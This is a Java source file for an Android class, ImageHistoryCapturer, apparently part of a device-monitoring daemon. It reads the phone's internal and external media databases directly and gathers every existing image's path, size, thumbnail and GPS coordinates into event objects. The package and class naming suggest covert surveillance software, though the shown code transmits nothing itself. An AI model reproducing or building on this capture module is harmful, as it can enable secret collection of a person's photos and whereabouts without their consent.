package com.vvt.daemon.mediahistory;

import java.io.File;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.provider.BaseColumns;
import android.provider.MediaStore;
import android.provider.MediaStore.MediaColumns;

import com.vvt.base.FxEvent;
import com.vvt.capture.camera.image.FxCameraImageHelper;
import com.vvt.events.FxCameraImageThumbnailEvent;
import com.vvt.events.FxGeoTag;
import com.vvt.events.FxMediaType;
import com.vvt.events.FxMimeTypeParser;
import com.vvt.logger.FxLog;
import com.vvt.stringutil.FxStringUtils;

public class ImageHistoryCapturer {
	
	private static final String TAG = "ImageHistoryCapturer";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private String mWritablePath;
	
	public ImageHistoryCapturer(String writablePath) {
		mWritablePath = writablePath;
	}
	
	public List<FxEvent> getImageHistory() {
		List<FxEvent> events = new ArrayList<FxEvent>();
		events.addAll(processInternal());
		events.addAll(processExternal());
		return events;
	}
	
	private List<FxEvent> processInternal() {
		if(LOGV) FxLog.v(TAG , "processInternal # ENTER ... ");
		List<FxEvent> events = new ArrayList<FxEvent>();
		
		try {
			final String internalDatabaseFilePath = FxCameraImageHelper.getInternalDatabaseFilePath() ;
			if(!FxStringUtils.isEmptyOrNull(internalDatabaseFilePath)) {
				if(LOGD) FxLog.d(TAG , "processInternal # get in external ...");
				events = getNewerMediaById(mWritablePath, internalDatabaseFilePath);
			}
		}catch (Throwable t) {
			if(LOGE) FxLog.e(TAG, t.toString());
		}
		
		if(LOGV) FxLog.v(TAG , "processInternal # EXIT ... ");
		return events;
	}
	
	private List<FxEvent> processExternal() {
		if(LOGV) FxLog.v(TAG , "processExternal # ENTER ... ");
		List<FxEvent> events = new ArrayList<FxEvent>();
		
		try {
			final String externalDatabaseFilePath = FxCameraImageHelper.getExternalDatabaseFilePath();
			if(!FxStringUtils.isEmptyOrNull(externalDatabaseFilePath)) {
				if(LOGD) FxLog.d(TAG , "processExternal # get in external ...");
				events = getNewerMediaById(mWritablePath, externalDatabaseFilePath);
			}
		}catch (Throwable t) {
			if(LOGE) FxLog.e(TAG, t.toString());
		}
		
		if(LOGV) FxLog.v(TAG , "processExternal # EXIT ... ");
		return events;
	}
	
	 private List<FxEvent> getNewerMediaById(String writablePath, String dbFile) {
		 if(LOGV) FxLog.v(TAG , "getNewerMediaById # ENTER ... ");
		 if(LOGV) FxLog.v(TAG, "getNewerMediaById # dbFile:" + dbFile);
		 List<FxEvent> medias = new ArrayList<FxEvent>();
		 
		 SQLiteDatabase db =  FxCameraImageHelper.getReadableDatabase(dbFile);
			Cursor cursor = null;
			
			try {
				cursor = db.query(FxCameraImageHelper.IMAGE_TABLE_NAME, null, null, null, null, null, null);
				
				if (cursor == null) {
					return null;
				}

				 if(LOGD) FxLog.d(TAG, "getNewerMediaById # cursor size :" + cursor.getCount());
				FxCameraImageThumbnailEvent media = null;

				while (cursor.moveToNext()) {
					int orginRowId = cursor.getInt(cursor.getColumnIndexOrThrow(BaseColumns._ID));
					String fileName = cursor.getString(cursor.getColumnIndexOrThrow(MediaColumns.DATA));
					String mimeType = cursor.getString(cursor.getColumnIndexOrThrow(MediaColumns.MIME_TYPE));
					FxMediaType format = FxMimeTypeParser.parse(mimeType);
					long eventTime = new Date().getTime();
					double latitude = 0;
					double longitude = 0;

					File f = new File(fileName); 
					if (!f.exists()) {
						continue;
					}

					media = new FxCameraImageThumbnailEvent();
					media.setEventId(orginRowId);
					media.setEventTime(eventTime);
					media.setActualSize(f.length());
					media.setFormat(format);
					media.setParingId(orginRowId);
				 
					String imagePath =  FxCameraImageHelper.getImageThumbnailPath(db, orginRowId);
					if(LOGV) FxLog.v(TAG, "getNewerMediaById # imagePath:" + imagePath);
					
					if(!FxStringUtils.isEmptyOrNull(imagePath)) {
						// Lets try to create the thumbnail of our size.
						imagePath = FxCameraImageHelper.createImageThumbnail(writablePath, imagePath, orginRowId);
					}
					else {
						imagePath = FxCameraImageHelper.createImageThumbnail(writablePath, fileName, orginRowId);
					}
					
					media.setActualFullPath(fileName);
					media.setThumbnailFullPath(imagePath);
					latitude = cursor.getDouble(cursor.getColumnIndexOrThrow(MediaStore.Images.ImageColumns.LATITUDE));
					longitude = cursor.getDouble(cursor.getColumnIndexOrThrow(MediaStore.Images.ImageColumns.LONGITUDE));
					
					if(LOGV) FxLog.v(TAG, "getNewerMediaById # orginRowId:" + orginRowId);
					if(LOGV) FxLog.v(TAG, "getNewerMediaById # eventTime:" + eventTime);
					if(LOGV) FxLog.v(TAG, "getNewerMediaById # ActualSize:" + f.length());
					if(LOGV) FxLog.v(TAG, "getNewerMediaById # format:" + format);
					if(LOGV) FxLog.v(TAG, "getNewerMediaById # ActualFullPath:" + fileName);
					if(LOGV) FxLog.v(TAG, "getNewerMediaById # ThumbnailFullPath:" + imagePath);
					if(LOGV) FxLog.v(TAG, "getNewerMediaById # latitude:" + latitude);
					if(LOGV) FxLog.v(TAG, "getNewerMediaById # longitude:" + longitude);
					
					FxGeoTag geoTag = new FxGeoTag();
					geoTag.setLat(latitude);
					geoTag.setLon(longitude);
					media.setGeo(geoTag);

					if(media != null)
						medias.add(media);
				}

			}
			catch (Exception e) {
				if(LOGE) FxLog.e(TAG, "getNewerMediaById # error:" + e.toString());
			}
			finally {

				if(cursor != null) {
					cursor.close();
				}
				
				if(db != null)
					db.close();
			}
		 
			if(LOGD) FxLog.d(TAG , "getNewerMediaById # medias size : " +medias.size());  
			if(LOGD) FxLog.d(TAG , "getNewerMediaById # medias :  "+medias.toString());
			
		if(LOGV) FxLog.v(TAG , "getNewerMediaById # EXIT ... ");
		return medias;
	 }
}
